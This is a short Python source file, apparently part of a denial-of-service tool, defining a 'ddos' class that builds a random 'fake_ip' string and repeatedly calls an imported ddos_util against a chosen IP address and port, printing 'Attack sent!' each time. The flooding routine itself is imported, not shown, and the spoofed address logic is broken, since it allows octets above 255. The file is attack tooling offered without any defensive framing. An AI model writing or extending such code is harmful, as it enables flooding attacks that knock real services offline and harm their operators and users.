import random
from .utilities.ddos_util import *

class ddos:
    def target(IP, PORT, duration):
        ip1 = random.randint(100, 999)
        ip2 = random.randint(10, 999)
        ip3 = random.randint(10, 999)
        ip4 = random.randint(10, 999)
        fake_ip = f"{ip1}.{ip2}.{ip3}.{ip4}"
        for i in range(duration):
            ddos_util(IP=IP, PORT=PORT, fake_ip=fake_ip)
            print("Attack sent!")
    
    
    def start(function):
        function()
